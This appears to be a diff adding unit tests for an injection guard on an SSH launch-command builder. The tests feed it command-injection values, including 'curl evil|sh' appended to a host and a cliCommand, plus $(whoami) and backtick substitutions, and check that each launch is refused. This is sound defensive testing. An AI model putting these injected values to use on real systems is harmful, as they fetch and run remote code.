@@ -529,6 +529,41 @@ describe('sessions', () => {
       }, null, 'plan');
       assert.equal(cmd, 'claude --verbose --permission-mode plan');
     });
+
+    describe('OpenClaw launch injection guard (#316)', () => {
+      const project = { engineId: 'openclaw:c1' };
+      const stubConn = (over) => {
+        const conn = { id: 'c1', host: '10.0.0.1', sshUser: 'admin', sshKeyPath: '/home/x/.ssh/k', cliCommand: 'openclaw-cli', ...over };
+        mock.method(store.openclawConnections, 'get', () => conn);
+      };
+      afterEach(() => mock.restoreAll());
+
+      it('builds a quoted ssh command for a safe connection', () => {
+        stubConn();
+        const cmd = sessions._buildLaunchCommand({}, project);
+        // -i is now quoted (was unquoted pre-#316).
+        assert.equal(cmd, 'ssh -t -i "/home/x/.ssh/k" admin@10.0.0.1 "openclaw-cli"');
+      });
+
+      it('refuses launch (undefined) on injection-shaped host/sshUser/sshKeyPath', () => {
+        for (const over of [{ host: '10.0.0.1; curl evil|sh' }, { sshUser: 'a$(whoami)' }, { sshKeyPath: '/k`id`' }]) {
+          stubConn(over);
+          assert.equal(sessions._buildLaunchCommand({}, project), undefined, JSON.stringify(over));
+          mock.restoreAll();
+        }
+      });
+
+      it('refuses launch on a cliCommand that could break out of the quotes', () => {
+        stubConn({ cliCommand: 'x"; curl evil|sh #' });
+        assert.equal(sessions._buildLaunchCommand({}, project), undefined);
+      });
+
+      it('still allows a cliCommand with plain flags', () => {
+        stubConn({ cliCommand: 'openclaw-cli --foo' });
+        const cmd = sessions._buildLaunchCommand({}, project);
+        assert.equal(cmd, 'ssh -t -i "/home/x/.ssh/k" admin@10.0.0.1 "openclaw-cli --foo"');
+      });
+    });
   });
 
   describe('_resolvePreKeys', () => {
